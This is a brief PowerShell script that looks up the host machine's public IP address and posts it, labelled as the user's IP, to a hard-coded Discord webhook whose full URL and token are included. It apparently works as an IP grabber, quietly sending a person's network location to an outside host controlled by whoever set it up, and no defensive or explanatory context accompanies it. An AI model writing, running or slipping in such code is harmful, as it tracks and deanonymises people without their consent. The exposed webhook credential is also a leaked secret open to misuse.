$publicIP = (Invoke-RestMethod -Uri "https://api.ipify.org")
$webhookUrl = "https://discord.com/api/webhooks/1389819264604569600/h2DDTTU2vhk4U12E7yzuE5miyvtzKUJLrOJVsUz970u0aEiNNVfKp8nO-RD_lniOvgoW"

$body = @{
    content = "User's public IP: $publicIP"
} | ConvertTo-Json

Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
